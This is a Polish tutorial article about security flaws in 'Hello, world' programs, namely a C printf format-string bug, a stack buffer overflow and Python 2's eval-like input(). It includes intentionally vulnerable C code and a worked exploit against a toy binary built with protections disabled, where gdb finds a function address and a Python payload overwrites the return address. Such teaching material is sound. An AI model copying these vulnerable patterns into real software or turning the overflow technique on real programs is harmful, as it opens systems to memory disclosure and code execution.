Witaj, świecie!

Każdy aspirujący informatyk z pewnością zetknął się niejednokrotnie ze słowami „Witaj, świecie!”. Dla wielu z nas był to pierwszy program napisany na początku przygody z programowaniem. A co gdybym Ci powiedział, że Twój pierwszy „Hello, world” mógł być podatny na bardzo poważne w skutkach ataki?

Zacznijmy jednak od wspomnienia skąd wzięło się kultowe „Witaj, świecie”. Pierwszy taki program został napisany w języku BCPL zaprojektowanym przez Martina Richardsa w 1967r. Następnie w 1972 ukazała się książka nt. programowania w języku B Briana Kernighana, w której zostało zaprezentowane wykorzystywanie zmiennych globalnych.


main( ) {
 extrn a,b,c;
 putchar(a); putchar(b); putchar(c); putchar('!*n');
}

a 'hell';
b 'o, w';
c 'orld';

Prawdziwą popularność „Hello, world” zyskało jednak dzięki publikacji książki „The C programming language” w 1978 r. Jak wspomina Kernighan, inspiracją była kreskówka, w której wykluwający się z jajka kurczak mówił „Hello, world!”. 

Teraz, gdy znamy już genezę tego pozornie niewinnego komunikatu, pora przyjrzeć się, jak może on stać się krytyczną luką bezpieczeństwa.

1. C i niezabezpieczony printf()

Napiszmy prosty przykład programu wyświetlającego „Witaj, świecie!” w języku C.


#include <stdio.h>

int main() {
    char *msg = "Hello, World!";
    printf(msg);
    return 0;
}

Na pierwszy rzut oka wszystko wygląda w porządku. Jednak kod ten posiada potencjalną lukę format string vulnerability. Dopóki zmienna msg nie posiada żadnych specyfikatorów formatu (np. %x, %s), printf() zadziała poprawnie. Jeśli natomist atakujący miałby wpływ na dane wejściowe programu, mógłby wywołać szereg niepożądanych zachowań. Przykład:


#include <stdio.h>

int main() {
    char msg[100];
    scanf("%s", msg); // użytkownik podaje dane
    printf(msg);
    return 0;
}

Funkcja printf() interpretuje pierwszy argument jako ciąg formatujący i oczekuje, że liczba i typ kolejnych argumentów będą zgodne z podanymi specyfikatorami. Jeżeli użytkownik wpisze np. ciąg „%x %x %x %x”, printf() zacznie odczytywać dane ze stosu, próbując znaleźć argumenty, których w rzeczywistości nie przekazano. Może to prowadzić do ujawnienia zawartości pamięci programu, a w bardziej zaawansowanych przypadkach — nawet do wykonania złośliwego kodu.

Jak to naprawić?

Zawsze używaj formatów jawnie:


printf("%s", msg);

Dzięki temu funkcja printf() wie, że nie powinien interpretować zmiennej msg jako format, a jedynie wypisać jej zawartość. Ta prosta praktyka znacznie zwiększa bezpieczeństwo kodu.

2. Buffer overflow w C

Spójrzmy na inny przykład w języku C:


#include <stdio.h>
#include <string.h>

int main() {
    char buffer[8];
    strcpy(buffer, "Hello, World!");
    printf("%s\n", buffer);
    return 0;
}

A gdzie tutaj tkwi problem? strcpy nie sprawdza długości! Bufor ma 8 bajtów, a „Hello, World!” ma ich 13 + null. Dochodzi tutaj do przepełnienia bufora (ang. buffer overflow), który może umożliwić nadpisanie pamięci, a nawet wykonanie złośliwego kodu.

Co prawda dzisiaj przepełnienie bufora nie jest już takie proste ze względu na różne rozwiązania implementowane we współczenych systemach (np. ASLR, DEP/NX czy stack canaries), ale w kontekście CTFów albo starszych systemów zagrożenie pozostaje jak najbardziej realne.

Przykład


#include <stdio.h>
#include <string.h>

void secret() {
    printf("Wykonałeś złośliwy kod!\n");
    // W prawdziwym ataku mogłoby tu być: system("/bin/sh");
}

void vulnerable_function(char *input) {
    char buffer[16];
    strcpy(buffer, input);
    printf("Wprowadzone dane: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Użycie: %s \n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}

Naszym zadaniem będzie wykonać procedurę secret(). Widzimy, że nigdzie w kodzie nie ma wywołania tej funkcji. Skompilujmy zatem powyższy przykład.


gcc -fno-stack-protector -z execstack -no-pie buff-over.c -o buff-over

Podczas kompilacji użyłem paru argumentów, które wyłączą wcześniej wspomniane zabezpieczenia tak, aby przepełnienie bufora było możliwe.

  • fno-stack-protector: wyłącza stack canaries
  • z execstack: pozwala wykonać kod na stosie
  • no-pie: brak losowania bazowego adresu (bez ASLR)

Nie przejmujcie się jeżeli brzmi to dla Was niezrozumiale. Zachęcam Was do doczytania na czym polegają powyższe techniki we własnym zakresie.

Kiedy wszystkie zabezpieczenia są już wyłączone, możemy przejść do eksploitacji. Na początek dokonamy analizy układu pamięci. Do tego zadania posłuży nam debugger gdb. Uruchamiamy go z nazwą naszego skompilowanego programu jako argument:


gdb buff-over

Następnie sprawdzamy adres funkcji secret


(gdb) disassemble secret

Przyjmijmy, że otrzymałeś wartość:


0x0000000000401146 <+0>:     push   %rbp

Świetnie! Mamy adres funkcji. W takim razie pozostało nam przygotować payload. Zauważmy, że adres składa się z 16 cyfr heksadecymalnych (świadczy o tym pierwsze 0x) każda cyfra odpowiada za 4 bity – mamy zatem adres 64-bitowy. Mamy tutaj 16 bajtów bufora + 8 bajtów %rbp. Oznacza to, że RET (Return From Procedure) znajduje się 24 bajty od początku bufora. Załadowywanie adresów funkcji do RET skutkuje wywołaniem się funkcji. Nasz payload będzie wyglądał w następujący sposób:


python3 -c 'print("A"*24 + "\x46\x11\x40\x00\x00\x00\x00\x00")' > payload

Tak przygotowany payload sprawi, że:

  • buffer[16] przepełni się 16 bajtami A
  • 8 bajtów nadpisze stary RBP
  • Kolejne 8 bajtów nadpisze adres powrotu funkcji
  • ret ➜ wskoczy na 0x401146

A więc sprawdźmy czy to działa


./buff-over "$(cat payload)"

Udało się! Sprawiliśmy, że funkcja została wywołana.

3. Python i input()

Spójrzcie proszę na ten prosty kod poniżej:


msg = input("Enter message: ")
print(msg)

Ten kod będzie działał dobrze i bez obaw o bezpieczeństwo – dopóki interpreterem jest Python3. W wersji 2 dyrektywa input() działała tak samo jak eval() – wykonywała wprowadzone przez użytkownika polecenia.

Jest to przykład podatności code injection. Program wyświetlający prosty ciąg znaków zmienił się w groźną lukę. Jak temu zapobiec? Używać raw_input(), który zawsze zwracał typ tekstowy.

To już wszystko co dla Was przygotowałem na dziś. Bierzcie te przykłady z przymrużeniem oka – zostały stworzone na potrzeby artykułu i często nie byłyby możliwe w realnym środowisku. Chciałem, aby uzmysłowiły jak pozornie banalny kod może zmienić się w dziurawe programy – mała luka, wielki problem!
